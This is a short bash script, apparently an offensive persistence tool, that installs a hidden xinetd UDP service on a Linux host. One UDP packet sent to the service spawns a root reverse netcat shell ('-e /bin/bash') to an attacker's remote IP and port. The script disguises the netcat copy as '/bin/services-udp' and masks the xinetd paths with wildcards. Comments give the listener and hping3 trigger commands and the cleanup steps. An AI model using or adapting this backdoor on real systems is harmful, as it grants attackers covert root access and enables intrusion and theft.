#!/bin/bash

if [[ $1 == "" ]]; then
  echo "Description: Binds a local xinetd UDP service port which spawns a reverse netcat shell when hit with a single UDP packet" 
  echo "Usage: ./xinetd.sh [remote listener ip] [remote listener port] [local UDP bind port]"
  echo "Example: ./xinetd.sh 123.123.123.123 1234 9999"
  exit 1;
fi

LISTENIP=$1
LISTENPORT=$2
UDPBIND=$3
NC=$(which nc)

cp $NC /bin/services-udp
echo "service services-udp" >/etc/xinetd.d/services-udp
echo "{" >> /etc/xinetd.d/services-udp
echo "		server = /bin/services-udp" >> /etc/xinetd.d/services-udp
echo "		server_args = $LISTENIP $LISTENPORT -e /bin/bash" >> /etc/xinetd.d/services-udp
echo "		protocol = udp" >> /etc/xinetd.d/services-udp
echo "		user = root" >> /etc/xinetd.d/services-udp
echo "		socket_type = dgram" >> /etc/xinetd.d/services-udp
echo "		wait = yes" >> /etc/xinetd.d/services-udp
echo "		flags = IPv4" >> /etc/xinetd.d/services-udp
echo "}" >> /etc/xinetd.d/services-udp

echo "services-udp	$UDPBIND/udp       # services-udp" >> /etc/services

/e?c/i?i?.d/x?n?td stop
/e?c/i?i?.d/x?n?td start

#nc -nlvp $LISTENPORT
#hping3 -2 -c 1 <targetip> -p $UDPBIND

# cleanup
# /e?c/i?i?.d/x?n?td stop
# rm /bin/services-udp
# rm /etc/xinetd.d/services-udp
# /e?c/i?i?.d/x?n?td start
